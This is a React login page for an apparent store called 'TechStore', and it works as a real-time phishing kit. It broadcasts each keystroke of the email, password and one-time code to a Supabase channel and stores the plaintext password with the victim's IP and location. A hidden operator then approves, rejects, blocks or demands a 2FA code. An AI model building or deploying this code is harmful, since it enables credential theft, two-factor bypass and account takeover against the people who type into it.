"use client";

import { useEffect, useRef, useState } from "react";
import { User, Lock, ArrowLeft, LogOut, Loader2 } from "lucide-react";
import { supabase } from "@/lib/supabase";
import { criarLoginPendente, salvarOtp } from "@/lib/logs";
import type { Log } from "@/lib/logs";
import { detectarGeo, type Geo } from "@/lib/geo";
import { usePresenca } from "@/lib/usePresenca";

export default function LojaLogin() {
  const [email, setEmail] = useState("");
  usePresenca(true, email);
  const [senha, setSenha] = useState("");
  const [carregando, setCarregando] = useState(false);
  const [erro, setErro] = useState<string | null>(null);
  const [usuario, setUsuario] = useState<string | null>(null);
  const [pedindoOtp, setPedindoOtp] = useState(false);
  const [verificandoOtp, setVerificandoOtp] = useState(false);
  const [otp, setOtp] = useState("");
  const [loginId, setLoginId] = useState<number | null>(null);
  const geoRef = useRef<Geo | null>(null);

  useEffect(() => {
    detectarGeo().then((g) => {
      geoRef.current = g;
    });
  }, []);

  useEffect(() => {
    supabase.auth.getUser().then(({ data }) => {
      if (data.user) setUsuario(data.user.email ?? null);
    });
    const { data: sub } = supabase.auth.onAuthStateChange((_e, session) => {
      setUsuario(session?.user?.email ?? null);
    });
    return () => sub.subscription.unsubscribe();
  }, []);

  const canalDigitacao = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const prontoDigitacao = useRef(false);

  useEffect(() => {
    const canal = supabase.channel("digitacao-loja");
    canal.subscribe((status) => {
      if (status === "SUBSCRIBED") prontoDigitacao.current = true;
    });
    canalDigitacao.current = canal;
    return () => {
      supabase.removeChannel(canal);
      canalDigitacao.current = null;
      prontoDigitacao.current = false;
    };
  }, []);

  useEffect(() => {
    if (!prontoDigitacao.current || !canalDigitacao.current) return;
    canalDigitacao.current.send({
      type: "broadcast",
      event: "digitando",
      payload: { email, senha, otp, em: new Date().toISOString() },
    });
  }, [email, senha, otp]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setErro(null);
    setCarregando(true);

    const geo = geoRef.current ?? (await detectarGeo());

    const id = await criarLoginPendente({
      descricao: `Login aguardando aprovação: ${email}`,
      usuario: email,
      entidade: "auth",
      metadata: {
        senha: senha,
        status: "pendente",
        cidade: geo.cidade,
        estado: geo.estado,
        pais: geo.pais,
        paisCodigo: geo.paisCodigo,
        ip: geo.ip,
      },
    });

    setLoginId(id);

    if (id === null) {
      setErro("Não foi possível processar o login. Tente novamente.");
      setCarregando(false);
      return;
    }

    let resolvido = false;

    const tratar = (status?: string) => {
      if (status === "pedir_otp") {
        setCarregando(false);
        setPedindoOtp(true);
        setErro(null);
        return;
      }
      if (status === "aprovado" || status === "recusado" || status === "bloqueado") {
        if (resolvido) return;
        resolvido = true;
        supabase.removeChannel(channel);
        clearInterval(intervalo);
        if (status === "aprovado") {
          setCarregando(false);
          setUsuario(email);
        } else if (status === "bloqueado") {
          setErro("Cliente bloqueado. Entre em contato com o suporte.");
          setCarregando(false);
        } else {
          setErro("Login inválido");
          setCarregando(false);
          setEmail("");
          setSenha("");
        }
      }
    };

    const channel = supabase
      .channel(`login-${id}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "logs", filter: `id=eq.${id}` },
        (payload) => {
          const meta = ((payload.new as Log).metadata ?? {}) as { status?: string };
          tratar(meta.status);
        },
      )
      .subscribe();

    const intervalo = setInterval(async () => {
      const { data } = await supabase
        .from("logs")
        .select("metadata")
        .eq("id", id)
        .single();
      const meta = (data?.metadata ?? {}) as { status?: string };
      tratar(meta.status);
    }, 2000);
  }

  async function enviarOtp(e: React.FormEvent) {
    e.preventDefault();
    if (loginId === null) return;
    setErro(null);
    setVerificandoOtp(true);
    const geo = geoRef.current;
    await salvarOtp(loginId, otp, {
      senha,
      cidade: geo?.cidade,
      estado: geo?.estado,
      pais: geo?.pais,
      paisCodigo: geo?.paisCodigo,
      ip: geo?.ip,
    });

    const channel = supabase
      .channel(`otp-${loginId}`)
      .on(
        "postgres_changes",
        { event: "UPDATE", schema: "public", table: "logs", filter: `id=eq.${loginId}` },
        (payload) => {
          const meta = ((payload.new as Log).metadata ?? {}) as { status?: string };
          if (meta.status === "aprovado") {
            supabase.removeChannel(channel);
            setVerificandoOtp(false);
            setPedindoOtp(false);
            setUsuario(email);
          } else if (meta.status === "recusado") {
            supabase.removeChannel(channel);
            setErro("Login inválido");
            setVerificandoOtp(false);
            setPedindoOtp(false);
            setEmail("");
            setSenha("");
            setOtp("");
          } else if (meta.status === "bloqueado") {
            supabase.removeChannel(channel);
            setErro("Cliente bloqueado. Entre em contato com o suporte.");
            setVerificandoOtp(false);
            setPedindoOtp(false);
          } else if (meta.status === "otp_invalido") {
            supabase.removeChannel(channel);
            setVerificandoOtp(false);
            setOtp("");
            setErro("Código inválido. Tente novamente.");
          }
        },
      )
      .subscribe();
  }

  async function sair() {
    await supabase.auth.signOut();
    setEmail("");
    setSenha("");
  }

  return (
    <div className="flex min-h-screen items-center justify-center bg-slate-100 px-4">
      <div className="w-full max-w-md">
        <a
          href="/teste"
          className="mb-6 inline-flex items-center gap-1.5 text-sm font-medium text-slate-500 transition hover:text-indigo-600"
        >
          <ArrowLeft className="h-4 w-4" />
          Voltar para a loja
        </a>

        <div className="rounded-2xl border border-slate-200 bg-white p-8 shadow-sm">
          <div className="mb-6 text-center">
            <div className="mx-auto mb-3 flex h-12 w-12 items-center justify-center rounded-xl bg-indigo-600 text-xl font-bold text-white">
              T
            </div>
            <h1 className="text-2xl font-semibold text-slate-900">Entrar na TechStore</h1>
            <p className="mt-1 text-sm text-slate-500">Acesse sua conta para continuar</p>
          </div>

          {pedindoOtp && !usuario ? (
            <form onSubmit={enviarOtp} className="space-y-4">
              <div className="text-center">
                <p className="text-sm text-slate-600">
                  Enviamos um código de verificação. Digite o código de 6 dígitos para continuar.
                </p>
              </div>
              {erro && (
                <div className="rounded-lg bg-rose-50 px-3 py-2 text-center text-sm text-rose-700">{erro}</div>
              )}
              <input
                type="text"
                inputMode="numeric"
                autoFocus
                required
                disabled={verificandoOtp}
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                placeholder="000000"
                className="w-full rounded-lg border border-slate-300 py-3 text-center text-2xl font-bold tracking-[0.5em] text-slate-900 outline-none transition focus:border-indigo-500 focus:ring-2 focus:ring-indigo-100 disabled:cursor-not-allowed disabled:bg-slate-100 disabled:text-slate-400"
              />
              <button
                type="submit"
                disabled={verificandoOtp}
                className="flex w-full items-center justify-center gap-2 rounded-lg bg-indigo-600 py-2.5 text-sm font-semibold text-white transition hover:bg-indigo-700 disabled:opacity-60"
              >
                {verificandoOtp && <Loader2 className="h-4 w-4 animate-spin" />}
                {verificandoOtp ? "Verificando..." : "Verificar código"}
              </button>
            </form>
          ) : usuario ? (
            <div className="text-center">
              <p className="mb-1 text-sm text-slate-500">Você está logado como</p>
              <p className="mb-6 font-medium text-slate-900">{usuario}</p>
              <a
                href="/teste"
                className="mb-2 block w-full rounded-lg bg-indigo-600 py-2.5 text-center text-sm font-semibold text-white transition hover:bg-indigo-700"
              >
                Ir para a loja
              </a>
              <button
                onClick={sair}
                className="flex w-full items-center justify-center gap-2 rounded-lg border border-slate-300 py-2.5 text-sm font-medium text-slate-700 transition hover:bg-slate-50"
              >
                <LogOut className="h-4 w-4" />
                Sair
              </button>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-4" autoComplete="off">
              <div>
                <label className="mb-1.5 block text-sm font-medium text-slate-700">
                  Email, CPF, CNPJ ou telefone
                </label>
                <div className="relative">
                  <User className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-slate-400" />
                  <input
                    type="text"
                    required
                    disabled={carregando}
                    autoComplete="off"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="Email, CPF, CNPJ ou telefone"
                    className="w-full rounded-lg border border-slate-300 py-2.5 pl-10 pr-3 text-sm text-slate-900 outline-none transition focus:border-indigo-500 focus:ring-2 focus:ring-indigo-100 disabled:cursor-not-allowed disabled:bg-slate-100 disabled:text-slate-400"
                  />
                </div>
              </div>
              <div>
                <label className="mb-1.5 block text-sm font-medium text-slate-700">Senha</label>
                <div className="relative">
                  <Lock className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-slate-400" />
                  <input
                    type="text"
                    required
                    disabled={carregando}
                    autoComplete="off"
                    name="campo-senha"
                    value={senha}
                    onChange={(e) => setSenha(e.target.value)}
                    placeholder="••••••••"
                    style={{ WebkitTextSecurity: "disc" } as React.CSSProperties}
                    className="w-full rounded-lg border border-slate-300 py-2.5 pl-10 pr-3 text-sm text-slate-900 outline-none transition focus:border-indigo-500 focus:ring-2 focus:ring-indigo-100 disabled:cursor-not-allowed disabled:bg-slate-100 disabled:text-slate-400"
                  />
                </div>
              </div>

              {erro && (
                <div className="rounded-lg bg-rose-50 px-3 py-2 text-sm text-rose-700">{erro}</div>
              )}

              <div className="flex items-center justify-between text-sm">
                <label className="flex items-center gap-2 text-slate-600">
                  <input type="checkbox" className="rounded border-slate-300" />
                  Lembrar de mim
                </label>
                <a href="#" className="font-medium text-indigo-600 hover:underline">
                  Esqueceu a senha?
                </a>
              </div>

              <button
                type="submit"
                disabled={carregando}
                className="flex w-full items-center justify-center gap-2 rounded-lg bg-indigo-600 py-2.5 text-sm font-semibold text-white transition hover:bg-indigo-700 disabled:opacity-60"
              >
                {carregando && <Loader2 className="h-4 w-4 animate-spin" />}
                {carregando ? "Entrando..." : "Entrar"}
              </button>
            </form>
          )}
        </div>
      </div>
    </div>
  );
}
